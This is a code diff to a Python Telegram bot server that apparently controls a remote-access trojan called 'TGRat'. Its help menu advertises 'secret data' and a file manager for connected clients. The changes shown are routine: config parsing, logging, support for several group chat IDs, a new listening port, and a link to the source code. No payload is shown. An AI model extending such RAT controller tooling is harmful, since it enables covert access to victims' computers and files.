@@ -7,8 +7,7 @@ import os
 from datetime import datetime
 import io
 import aiofiles 
-import json
-from aiogram import Bot, Dispatcher, F
+from aiogram import Bot, Dispatcher, F, Router
 from aiogram.types import FSInputFile
 from aiogram.filters import Command, BaseFilter, CommandObject
 from aiogram.types import Message, ContentType
@@ -20,37 +19,44 @@ logger = logging.getLogger(__name__)
 
 
 DATA = {}
+
 # Чтение файла 'data_info.txt'
 try:
     with open('data_info.txt', 'r', encoding='utf-8') as file:
         for line in file:
             # Очистка строки от пробелов и символов переноса
             line = line.strip()
+            
             # Если в строке есть '=', обрабатываем ее
             if '=' in line:
                 key, value = line.split('=', 1)
                 DATA[key.strip()] = value.strip()
-except FileNotFoundError:
-    print("Критическая ошибка: Файл 'data_info.txt' не найден. Проверьте путь.")
 
+except FileNotFoundError:
+    logger.error("Критическая ошибка: Файл 'data_info.txt' не найден. Проверьте путь.")
+    # exit()
+
+# Присвоение считанных значений переменным
 try:
     TOKEN = DATA['TOKEN']
-    
-    # Блок для нескольких ID
-    # 1. Берем строку со всеми ID
     ids_string = DATA['GROUP_CHAT_IDS']
     
-    # 2. Разбиваем строку по запятой, убирая лишние пробелы с каждого ID
-    id_list_str = [id_str.strip() for id_str in ids_string.split(',')]
+    # 1. Разбиваем строку по запятой, удаляем пробелы (strip()) и отфильтровываем пустые элементы.
+    # Это работает как для одного ID (разбивается на один элемент), так и для нескольких.
+    id_list_str = [id_str.strip() for id_str in ids_string.split(',') if id_str.strip()]
     
-    # 3. Преобразуем список строк в список целых чисел (int)
-    GROUP_CHAT_IDS = [int(id_str) for id_str in id_list_str if id_str]
+    # 2. Преобразуем список строк в список целых чисел (int)
+    GROUP_CHAT_IDS = [int(id_str) for id_str in id_list_str]
+    # ----------------------------------------------------
     
-    print("Данные успешно загружены из data_info.txt.")
+    logger.info("Данные успешно загружены из data_info.txt.")
+    
+    if not GROUP_CHAT_IDS:
+        logger.info("Внимание: В файле 'GROUP_CHAT_IDS' не указаны корректные ID.")
 except KeyError as e:
-    print(f"Ошибка: Ключ {e} не найден в файле 'data_info.txt'. Убедитесь, что используются ключи 'TOKEN' и 'GROUP_CHAT_IDS'.")
+    logger.error(f"Ошибка: Ключ {e} не найден в файле 'data_info.txt'. Убедитесь, что используются ключи 'TOKEN' и 'GROUP_CHAT_IDS'.")
 except ValueError:
-    print("Ошибка: Одно или несколько значений в 'GROUP_CHAT_IDS' не являются корректными целыми числами.")
+    logger.error("Ошибка: Одно или несколько значений в 'GROUP_CHAT_IDS' не являются корректными целыми числами.")
 
 
 bot = Bot(TOKEN)
@@ -60,7 +66,7 @@ clients = {}
 upload_requests = {}
 clients_lock = asyncio.Lock()
 HOST = '0.0.0.0'
-PORT = 4321
+PORT = 1234
 HISTORY_FILE = "client_history.json"
 clients = {}
 CLIENT_HISTORY_CACHE = {}
@@ -69,7 +75,7 @@ BOT_USERNAME = ""
 
 class IsInGroup(BaseFilter):
     async def __call__(self, message: Message) -> bool:
-        return message.chat.id == GROUP_CHAT_ID
+        return message.chat.id in GROUP_CHAT_IDS
 
 def is_valid_filename(filename):
     invalid = '<>:"/\\|?*'
@@ -499,7 +505,7 @@ async def check_clients_status():
 async def handle_help(message: Message):
     help_text = """
 <b>💻 💎Секретные данные💎</b>
-    <b>Исходный код:❌</b>
+    <b><a href="https://github.com/EZIKALEXANDR/TGRat">Исходный код</a></b>
     <b>Made by @UNBLOCK_COMPUTER</b>
 -----------------------------------
 <b>📁 Файловый менеджер</b>
@@ -888,4 +894,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-
